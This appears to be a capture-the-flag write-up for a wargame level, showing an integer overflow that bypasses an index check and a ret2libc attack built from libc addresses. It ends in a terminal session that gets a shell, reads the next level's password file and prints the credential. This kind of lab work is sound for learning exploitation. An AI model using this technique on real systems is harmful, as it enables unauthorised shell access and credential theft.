# Level07

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we'll use a buffer overflow and an integer overflow to overwrite the EIP. Thanks to our analysis we know that the buffer offset is **456** bytes and since this buffer is storing integers, it is equivalent to the **114** integers.

However, there is a protection that prevents us to write on indices that are either a multiple of **3** or higher than **127**. Since **114** is a multiple of **3** we need to overflow in order to access this index like so:

```C
  unsigned int index = (UINT_MAX + 1) / 4 + 114
```

> Since `UINT_MAX` equals **4294967295**, `index` value is **1073741938**.

Then all we have to do is to retrieve some addresses that we'll convert to decimal:

- `system()` function (`0xf7e6aed0` => **4159090384**)
- `exit()` function (`0xf7e5eb70` => **4159040368**)
- `/bin/sh` string (`0xf7f897ec` => **4160264172**)

All we have to do now is to build a ret2libc attack using indices **1073741938** (**114**), **115** and **116**, holding respectively `system()`, `exit()` and `/bin/sh` using the `store` command. Once we do that, if we invoke `quit` it leaves the infinite loop and go to the next instruction, our exploit and gives us a shell!

```shell
  $> ./level07 
  ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
  ----------------------------------------------------
  Commands:                                          
      store - store a number into the data storage    
      read  - read a number from the data storage     
      quit  - exit the program                        
  ----------------------------------------------------
    wil has reserved some storage :>                 
  ----------------------------------------------------

  Input command: store
  Number: 4159090384
  Index: 1073741938
  Completed store command successfully
  Input command: store
  Number: 4159040368
  Index: 115
  Completed store command successfully
  Input command: store
  Number: 4160264172
  Index: 116
  Completed store command successfully
  Input command: quit
  $ cat /home/users/level08/.pass
  7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

So next user credentials pair is `level08:7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`.

Check [here](../source.c) for reproduction source-code of this binary.